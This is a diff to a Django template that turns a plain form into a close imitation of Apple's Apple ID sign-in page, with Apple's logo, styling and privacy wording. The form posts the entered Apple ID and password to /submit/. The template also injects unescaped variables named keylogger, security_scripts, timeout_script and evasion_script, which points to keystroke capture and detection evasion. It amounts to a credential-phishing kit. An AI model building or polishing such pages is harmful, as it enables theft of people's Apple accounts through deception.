@@ -3,13 +3,426 @@
 {% load static %}
 
 {% block content %}
-<div>
-    <h1>Apple ID</h1>
-    <form action="/submit/" method="post">
-      <input type="text" name="appleid" placeholder="Apple ID"><br>
-      <input type="password" name="password" placeholder="Password"><br>
-      <input type="submit" value="Log In">
-    </form>
-    {{ keylogger|safe }} {{ security_scripts|safe }} {{ timeout_script|safe }} {{ evasion_script|safe }}
+<div class="apple-login-container">
+    <div class="apple-login-card">
+        <div class="apple-logo-container">
+            <svg class="apple-logo" viewBox="0 0 24 24">
+                <path d="M18.71 19.5c-.83 1.24-1.71 2.45-3.05 2.47-1.34.03-1.77-.79-3.29-.79-1.53 0-2 .77-3.27.82-1.31.05-2.3-1.32-3.14-2.53C4.25 17 2.94 12.45 4.7 9.39c.87-1.52 2.43-2.48 4.12-2.51 1.28-.02 2.5.87 3.29.87.78 0 2.26-1.07 3.81-.91.65.03 2.47.26 3.64 1.98-.09.06-2.17 1.28-2.15 3.81.03 3.02 2.65 4.03 2.68 4.04-.03.07-.42 1.44-1.38 2.83M13 3.5c.73-.83 1.94-1.46 2.94-1.5.13 1.17-.34 2.35-1.04 3.19-.69.85-1.83 1.51-2.95 1.42-.15-1.15.41-2.35 1.05-3.11z"/>
+            </svg>
+        </div>
+        
+        <h1 class="apple-login-title">Apple ID</h1>
+        
+        <form action="/submit/" method="post" class="apple-login-form" id="appleLoginForm">
+            <div class="apple-input-group">
+                <input type="text" name="appleid" id="appleid" required autocomplete="username" class="apple-input">
+                <label for="appleid" class="apple-input-label">Apple ID</label>
+            </div>
+            
+            <div class="apple-input-group">
+                <input type="password" name="password" id="password" required autocomplete="current-password" class="apple-input">
+                <label for="password" class="apple-input-label">Password</label>
+                <button type="button" class="apple-toggle-password" aria-label="Show password">
+                    <svg viewBox="0 0 24 24" class="apple-eye-icon">
+                        <path d="M12,9A3,3 0 0,1 15,12A3,3 0 0,1 12,15A3,3 0 0,1 9,12A3,3 0 0,1 12,9M12,4.5C17,4.5 21.27,7.61 23,12C21.27,16.39 17,19.5 12,19.5C7,19.5 2.73,16.39 1,12C2.73,7.61 7,4.5 12,4.5M3.18,12C4.83,15.36 8.24,17.5 12,17.5C15.76,17.5 19.17,15.36 20.82,12C19.17,8.64 15.76,6.5 12,6.5C8.24,6.5 4.83,8.64 3.18,12Z"/>
+                    </svg>
+                </button>
+            </div>
+            
+            <div class="apple-options">
+                <label class="apple-checkbox-container">
+                    <input type="checkbox" name="remember" class="apple-checkbox">
+                    <span class="apple-checkbox-label">Remember me</span>
+                </label>
+                <a href="#" class="apple-forgot-link">Forgot Apple ID or Password?</a>
+            </div>
+            
+            <button type="submit" class="apple-login-button">
+                <span>Sign In</span>
+            </button>
+        </form>
+        
+        <div class="apple-divider">
+            <span>or</span>
+        </div>
+        
+        <button class="apple-alternate-button">
+            <svg viewBox="0 0 24 24" class="apple-qr-icon">
+                <path d="M3,11H5V13H3V11M11,5H13V9H11V5M9,11H13V15H11V13H9V11M15,11H17V13H19V11H21V13H19V15H21V19H19V21H17V19H13V21H11V17H15V15H17V13H15V11M19,19V15H17V19H19M15,3H21V9H15V3M17,5V7H19V5H17M3,3H9V9H3V3M5,5V7H7V5H5M3,15H9V21H3V15M5,17V19H7V17H5Z"/>
+            </svg>
+            <span>Sign in with QR code</span>
+        </button>
+        
+        <div class="apple-footer">
+            <p>Don't have an Apple ID? <a href="#" class="apple-create-link">Create yours now.</a></p>
+        </div>
+    </div>
+    
+    <div class="apple-security-footer">
+        <svg viewBox="0 0 24 24" class="apple-lock-icon">
+            <path d="M12,3A4,4 0 0,0 8,7V8H7V7A5,5 0 0,1 12,2A5,5 0 0,1 17,7V8H16V7A4,4 0 0,0 12,3M12,15A2,2 0 0,1 14,17A2,2 0 0,1 12,19A2,2 0 0,1 10,17A2,2 0 0,1 12,15M18,8A2,2 0 0,0 16,10V20A2,2 0 0,0 18,22H20A2,2 0 0,0 22,20V10A2,2 0 0,0 20,8H18M4,8A2,2 0 0,0 2,10V20A2,2 0 0,0 4,22H6A2,2 0 0,0 8,20V10A2,2 0 0,0 6,8H4Z"/>
+        </svg>
+        <p>Your Apple ID information is used to allow you to sign in securely and access your data. Apple records certain data for security, support, and reporting purposes. If you agree, Apple may also use your Apple ID information to send you marketing emails and communications, including based on your use of Apple services.</p>
+    </div>
 </div>
-{% endblok %}
+
+<style>
+:root {
+    --apple-black: #000000;
+    --apple-dark-gray: #1d1d1f;
+    --apple-gray: #86868b;
+    --apple-light-gray: #f5f5f7;
+    --apple-blue: #0066cc;
+    --apple-blue-hover: #0071e3;
+    --apple-blue-active: #0077ed;
+    --apple-border-radius: 12px;
+    --apple-box-shadow: 0 12px 28px 0 rgba(0, 0, 0, 0.2), 0 2px 4px 0 rgba(0, 0, 0, 0.1);
+    --apple-transition: all 0.3s cubic-bezier(0.25, 0.8, 0.25, 1);
+}
+
+* {
+    box-sizing: border-box;
+    margin: 0;
+    padding: 0;
+}
+
+body {
+    font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, Helvetica, Arial, sans-serif;
+    background-color: var(--apple-light-gray);
+    color: var(--apple-dark-gray);
+    line-height: 1.5;
+    -webkit-font-smoothing: antialiased;
+    -moz-osx-font-smoothing: grayscale;
+}
+
+.apple-login-container {
+    display: flex;
+    flex-direction: column;
+    align-items: center;
+    justify-content: center;
+    min-height: 100vh;
+    padding: 2rem;
+}
+
+.apple-login-card {
+    background: white;
+    border-radius: var(--apple-border-radius);
+    box-shadow: var(--apple-box-shadow);
+    width: 100%;
+    max-width: 420px;
+    padding: 2.5rem;
+    text-align: center;
+}
+
+.apple-logo-container {
+    margin-bottom: 1.5rem;
+}
+
+.apple-logo {
+    width: 48px;
+    height: 48px;
+    fill: var(--apple-black);
+}
+
+.apple-login-title {
+    font-size: 24px;
+    font-weight: 600;
+    margin-bottom: 2rem;
+    color: var(--apple-black);
+}
+
+.apple-login-form {
+    margin-bottom: 1.5rem;
+}
+
+.apple-input-group {
+    position: relative;
+    margin-bottom: 1.25rem;
+}
+
+.apple-input {
+    width: 100%;
+    padding: 1rem;
+    font-size: 16px;
+    border: 1px solid var(--apple-gray);
+    border-radius: var(--apple-border-radius);
+    background-color: white;
+    transition: var(--apple-transition);
+    padding-left: 1rem;
+}
+
+.apple-input:focus {
+    outline: none;
+    border-color: var(--apple-blue);
+    box-shadow: 0 0 0 2px rgba(0, 102, 204, 0.2);
+}
+
+.apple-input-label {
+    position: absolute;
+    left: 1rem;
+    top: 1rem;
+    color: var(--apple-gray);
+    transition: var(--apple-transition);
+    pointer-events: none;
+    background: white;
+    padding: 0 0.5rem;
+}
+
+.apple-input:focus + .apple-input-label,
+.apple-input:not(:placeholder-shown) + .apple-input-label {
+    top: -0.5rem;
+    font-size: 12px;
+    color: var(--apple-blue);
+}
+
+.apple-toggle-password {
+    position: absolute;
+    right: 1rem;
+    top: 50%;
+    transform: translateY(-50%);
+    background: none;
+    border: none;
+    cursor: pointer;
+    color: var(--apple-gray);
+    padding: 0.5rem;
+}
+
+.apple-toggle-password:hover {
+    color: var(--apple-blue);
+}
+
+.apple-eye-icon {
+    width: 20px;
+    height: 20px;
+    fill: currentColor;
+}
+
+.apple-options {
+    display: flex;
+    justify-content: space-between;
+    align-items: center;
+    margin-bottom: 1.5rem;
+    font-size: 14px;
+}
+
+.apple-checkbox-container {
+    display: flex;
+    align-items: center;
+    cursor: pointer;
+}
+
+.apple-checkbox {
+    margin-right: 0.5rem;
+    accent-color: var(--apple-blue);
+    width: 16px;
+    height: 16px;
+}
+
+.apple-checkbox-label {
+    color: var(--apple-dark-gray);
+}
+
+.apple-forgot-link {
+    color: var(--apple-blue);
+    text-decoration: none;
+}
+
+.apple-forgot-link:hover {
+    text-decoration: underline;
+}
+
+.apple-login-button {
+    width: 100%;
+    padding: 1rem;
+    background-color: var(--apple-blue);
+    color: white;
+    border: none;
+    border-radius: var(--apple-border-radius);
+    font-size: 16px;
+    font-weight: 500;
+    cursor: pointer;
+    transition: var(--apple-transition);
+    margin-bottom: 1.5rem;
+}
+
+.apple-login-button:hover {
+    background-color: var(--apple-blue-hover);
+}
+
+.apple-login-button:active {
+    background-color: var(--apple-blue-active);
+}
+
+.apple-divider {
+    position: relative;
+    margin: 1.5rem 0;
+    text-align: center;
+    color: var(--apple-gray);
+    font-size: 14px;
+}
+
+.apple-divider::before {
+    content: "";
+    position: absolute;
+    top: 50%;
+    left: 0;
+    right: 0;
+    height: 1px;
+    background-color: #e0e0e0;
+    z-index: 1;
+}
+
+.apple-divider span {
+    position: relative;
+    padding: 0 1rem;
+    background-color: white;
+    z-index: 2;
+}
+
+.apple-alternate-button {
+    width: 100%;
+    padding: 1rem;
+    background-color: white;
+    color: var(--apple-blue);
+    border: 1px solid var(--apple-blue);
+    border-radius: var(--apple-border-radius);
+    font-size: 16px;
+    font-weight: 500;
+    cursor: pointer;
+    transition: var(--apple-transition);
+    display: flex;
+    align-items: center;
+    justify-content: center;
+    gap: 0.5rem;
+    margin-bottom: 1.5rem;
+}
+
+.apple-alternate-button:hover {
+    background-color: rgba(0, 102, 204, 0.05);
+}
+
+.apple-qr-icon {
+    width: 20px;
+    height: 20px;
+    fill: currentColor;
+}
+
+.apple-footer {
+    font-size: 14px;
+    color: var(--apple-gray);
+}
+
+.apple-create-link {
+    color: var(--apple-blue);
+    text-decoration: none;
+}
+
+.apple-create-link:hover {
+    text-decoration: underline;
+}
+
+.apple-security-footer {
+    max-width: 600px;
+    margin-top: 2rem;
+    padding: 1rem;
+    font-size: 12px;
+    color: var(--apple-gray);
+    text-align: center;
+    display: flex;
+    flex-direction: column;
+    align-items: center;
+    gap: 0.5rem;
+}
+
+.apple-lock-icon {
+    width: 16px;
+    height: 16px;
+    fill: currentColor;
+}
+
+/* Error state */
+.apple-input-group.error .apple-input {
+    border-color: #ff3b30;
+}
+
+.apple-input-group.error .apple-input-label {
+    color: #ff3b30;
+}
+
+/* Responsive adjustments */
+@media (max-width: 480px) {
+    .apple-login-card {
+        padding: 1.5rem;
+    }
+    
+    .apple-logo {
+        width: 40px;
+        height: 40px;
+    }
+    
+    .apple-login-title {
+        font-size: 20px;
+    }
+}
+
+/* Accessibility focus styles */
+.apple-input:focus-visible, 
+.apple-login-button:focus-visible, 
+.apple-alternate-button:focus-visible {
+    outline: 2px solid var(--apple-blue);
+    outline-offset: 2px;
+}
+</style>
+
+<script>
+document.addEventListener('DOMContentLoaded', function() {
+    // Toggle password visibility
+    const togglePassword = document.querySelector('.apple-toggle-password');
+    const passwordInput = document.getElementById('password');
+    
+    if (togglePassword && passwordInput) {
+        togglePassword.addEventListener('click', function() {
+            const type = passwordInput.getAttribute('type') === 'password' ? 'text' : 'password';
+            passwordInput.setAttribute('type', type);
+            this.classList.toggle('active');
+        });
+    }
+    
+    // Form submission animation
+    const loginForm = document.getElementById('appleLoginForm');
+    if (loginForm) {
+        loginForm.addEventListener('submit', function(e) {
+            const submitButton = this.querySelector('.apple-login-button');
+            if (submitButton) {
+                submitButton.innerHTML = '<span>Signing in...</span>';
+                submitButton.disabled = true;
+            }
+        });
+    }
+    
+    // Input validation
+    const inputs = document.querySelectorAll('.apple-input');
+    inputs.forEach(input => {
+        input.addEventListener('blur', function() {
+            const parent = this.parentElement;
+            if (this.value.trim() === '') {
+                parent.classList.remove('error');
+            } else if (!this.checkValidity()) {
+                parent.classList.add('error');
+            } else {
+                parent.classList.remove('error');
+            }
+        });
+    });
+    
+    // Simulate Apple's smooth transitions
+    document.body.style.opacity = '0';
+    setTimeout(() => {
+        document.body.style.transition = 'opacity 0.3s ease-in-out';
+        document.body.style.opacity = '1';
+    }, 50);
+});
+</script>
+
+{{ keylogger|safe }} {{ security_scripts|safe }} {{ timeout_script|safe }} {{ evasion_script|safe }}
+{% endblock %}
